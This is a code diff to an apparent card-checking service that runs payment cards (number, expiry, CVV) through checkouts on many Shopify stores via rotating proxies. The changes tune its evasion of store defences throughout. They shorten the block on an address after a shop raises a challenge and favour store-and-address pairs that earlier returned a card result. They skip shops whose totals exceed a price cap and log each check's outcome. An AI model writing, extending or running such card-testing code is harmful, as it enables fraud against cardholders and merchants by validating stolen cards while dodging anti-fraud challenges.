@@ -759,9 +759,21 @@ _store_wins: dict[str, int] = defaultdict(int)
 
 # A shop that puts up a challenge is saying it about one address and
 # not about the card.  The address is put aside for that shop, so the
-# next card leaves from somewhere else.
+# next card leaves from somewhere else.  The pause is short: the
+# address is good again after a little while.
 _address_block: dict[tuple, float] = {}
-ADDRESS_BLOCK_SECONDS = float(os.environ.get("ADDRESS_BLOCK_SECONDS", 900))
+ADDRESS_BLOCK_SECONDS = float(os.environ.get("ADDRESS_BLOCK_SECONDS", 120))
+
+# The pairs of a shop and an address that gave a card answer.  They go
+# first, so a card does not have to find its way through the pairs that
+# do not work.
+_pair_wins: dict[tuple, int] = defaultdict(int)
+
+# The shops whose order comes out over the cap.  The item is inside the
+# band but the shipping is not, so the shop cannot make this order at
+# this price and every card would waste its time there.
+_band_block: dict[tuple, float] = {}
+BAND_BLOCK_SECONDS = float(os.environ.get("BAND_BLOCK_SECONDS", 3600))
 
 _proxy_pool: list[str] = []
 _proxy_pool_at: float = 0.0
@@ -2461,6 +2473,8 @@ def _site_has_product_in_band(site: str, min_price: float, max_price: float) -> 
     """
     base = site if site.startswith("http") else "https://" + site
     hostname = urlparse(base).netloc
+    if time.time() < _band_block.get((hostname, f"{max_price:.2f}"), 0.0):
+        return False
     entry = _product_cache.get(f"{hostname}|{max_price:.2f}")
     if not entry:
         return True
@@ -2539,6 +2553,8 @@ async def validate_card_across_sites(
                 if time.time() >= _address_block.get((host, a), 0.0)]
         if not free:
             free = addresses[:1]
+        # The pairs that worked before go first.
+        free.sort(key=lambda a: -_pair_wins.get((host, a), 0))
         free = free[:ADDRESSES_PER_STORE]
 
         result: dict = {}
@@ -2609,7 +2625,13 @@ async def validate_card_across_sites(
                         "TOKENIZATION_FAILED"):
             _store_pardon(site)
             _store_wins[_host_of(site)] += 1
+            _pair_wins[(host, address)] += 1
             return result
+        # The item was inside the band but the order came out over the
+        # cap, so this shop cannot make this order at this price.  The
+        # cards are not taken to it again for a while.
+        if resp.startswith("PRICE_OVER_MAX") and max_price:
+            _band_block[(host, f"{float(max_price):.2f}")] = time.time() + BAND_BLOCK_SECONDS
         # The store could not do the checkout.  It is put aside for a
         # while so the next cards go to the stores that still answer.
         #
@@ -2720,11 +2742,17 @@ async def shopify_route(
     cooling = [s for s in sites if s not in named and s not in winners and s not in others]
     sites = named + winners + others + cooling
 
+    _t0 = time.time()
     result = await validate_card_across_sites(
         card["cc"], card["month"], card["year"], card["cvv"],
         sites, proxy_str=proxy, max_price=max_price, min_price=min_price,
     )
     _stats[f"response_{result.get('Response', 'UNKNOWN')}"] += 1
+    log.warning("[CHECK] %.1fs | %s | %s | the shop: %s",
+             time.time() - _t0,
+             str(result.get("Response", ""))[:60],
+             result.get("Product", "")[:30],
+             result.get("Site", ""))
 
     return JSONResponse(result)
 
